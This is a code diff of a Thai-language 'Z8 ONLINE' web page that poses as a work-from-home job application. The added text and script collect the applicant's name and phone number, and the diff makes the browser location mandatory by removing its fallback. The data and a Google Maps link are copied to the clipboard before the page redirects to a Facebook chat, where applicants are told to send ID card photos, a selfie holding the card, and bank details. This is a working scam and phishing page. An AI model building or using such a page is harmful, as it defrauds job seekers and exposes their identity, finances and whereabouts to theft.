@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
 <title>Z8 ONLINE</title>
 
 <style>
@@ -19,8 +18,7 @@ body{
 .wrapper{
   max-width:420px;
   margin:auto;
-  width:100%;
-  padding-bottom:80px;
+  padding-bottom:90px;
 }
 
 /* HEADER */
@@ -33,12 +31,8 @@ body{
   border-radius:50%;
   box-shadow:0 0 15px #22c55e;
 }
-h1{
-  font-size:20px;
-  color:#38bdf8;
-}
+h1{color:#38bdf8;font-size:20px;}
 
-/* REF */
 .ref{
   text-align:center;
   color:#22c55e;
@@ -52,16 +46,16 @@ h1{
   margin:10px;
   padding:14px;
   border-radius:12px;
+  font-size:14px;
 }
 
 /* INPUT */
-input,textarea{
+input{
   width:100%;
   padding:12px;
   margin-top:8px;
   border-radius:10px;
   border:none;
-  font-size:14px;
 }
 
 /* BUTTON */
@@ -112,11 +106,51 @@ input,textarea{
 
 <div class="ref">📌 ผู้แนะนำ: วิน</div>
 
+<!-- 🔥 รายละเอียดงาน -->
+<div class="card">
+🔥 โอกาสมาแล้ว! หาเงินออนไลน์กับ "Z8 online" 🔥<br><br>
+
+💸 งานเสริม / งานหลัก ทำได้จากที่บ้าน<br>
+📱 ใช้แค่มือถือ + อินเทอร์เน็ต<br>
+⏰ เลือกเวลาทำเองได้ ไม่จำกัด<br><br>
+
+✨ เหมาะสำหรับ<br>
+- คนอยากมีรายได้เพิ่ม<br>
+- นักเรียน / นักศึกษา / คนทำงาน<br>
+- คนที่อยากเริ่มหาเงินออนไลน์จริงจัง<br><br>
+
+💰 รายได้ขึ้นอยู่กับความขยัน<br>
+(รายละเอียดเงินทักแชทมาคุยได้เลย)<br><br>
+
+📩 สนใจทักมาได้ทันที!<br>
+👉 มีสอนงานให้ ไม่ต้องมีประสบการณ์<br><br>
+
+🔥 เริ่มก่อน ได้ก่อน โอกาสมีจำกัด!
+</div>
+
+<!-- 🔥 ขั้นตอนสมัคร -->
+<div class="card">
+<b>📌 วิธีสมัครงาน</b><br><br>
+
+1️⃣ กรอกชื่อและเบอร์ด้านล่าง<br>
+2️⃣ กดปุ่มสมัครงาน<br>
+3️⃣ อนุญาตตำแหน่ง (เพื่อยืนยันตัวตน)<br>
+4️⃣ ระบบจะคัดลอกข้อมูลให้อัตโนมัติ<br>
+5️⃣ เข้าแชท HR → วาง → ส่งได้ทันที<br><br>
+
+📎 จากนั้นส่งรูปเพิ่มเติมในแชท:
+- รูปบัตรประชาชน  
+- รูปหน้าคู่บัตร  
+- ข้อมูลบัญชี  
+</div>
+
+<!-- 🔥 ฟอร์ม -->
 <div class="card">
 <b>📋 กรอกข้อมูลสมัคร</b>
 
 <input id="name" placeholder="ชื่อ-นามสกุล">
 <input id="phone" placeholder="เบอร์โทร">
+
 <p class="status" id="status">ระบบจะขอพิกัดอัตโนมัติ</p>
 </div>
 
@@ -136,16 +170,11 @@ function submitForm(){
   let phone=document.getElementById("phone").value;
 
   if(!name || !phone){
-    alert("กรุณากรอกชื่อและเบอร์ให้ครบ");
+    alert("กรุณากรอกข้อมูลให้ครบ");
     return;
   }
 
   document.getElementById("status").innerText="📍 กำลังขอตำแหน่ง...";
-
-  if(!navigator.geolocation){
-    proceed("(ไม่มีพิกัด)",name,phone);
-    return;
-  }
 
   navigator.geolocation.getCurrentPosition(function(pos){
 
@@ -154,16 +183,7 @@ function submitForm(){
 
     let location=`https://maps.google.com/?q=${lat},${lon}`;
 
-    proceed(location,name,phone);
-
-  },function(){
-    proceed("(ไม่ได้เปิดตำแหน่ง)",name,phone);
-  });
-}
-
-function proceed(location,name,phone){
-
-  let text=`🔥 สมัครงาน Z8 ONLINE
+    let text=`🔥 สมัครงาน Z8 ONLINE
 
 📌 ผู้แนะนำ: วิน
 
@@ -185,26 +205,24 @@ ${location}
 
 📩 กรุณาส่งข้อมูลทั้งหมดให้ HR เพื่อดำเนินการสมัครงาน`;
 
-  copy(text);
+    copy(text);
 
-  document.getElementById("status").innerText="✅ คัดลอกแล้ว พร้อมส่ง";
+    document.getElementById("status").innerText="✅ คัดลอกแล้ว พร้อมส่ง";
 
-  setTimeout(()=>{
-    window.location.href="https://www.facebook.com/share/1RtTcrR6Bu/";
-  },700);
+    setTimeout(()=>{
+      window.location.href="https://www.facebook.com/share/1RtTcrR6Bu/";
+    },700);
+
+  });
 }
 
 function copy(text){
-  try{
-    navigator.clipboard.writeText(text);
-  }catch{
-    let t=document.createElement("textarea");
-    t.value=text;
-    document.body.appendChild(t);
-    t.select();
-    document.execCommand("copy");
-    document.body.removeChild(t);
-  }
+  let t=document.createElement("textarea");
+  t.value=text;
+  document.body.appendChild(t);
+  t.select();
+  document.execCommand("copy");
+  document.body.removeChild(t);
 }
 </script>
 
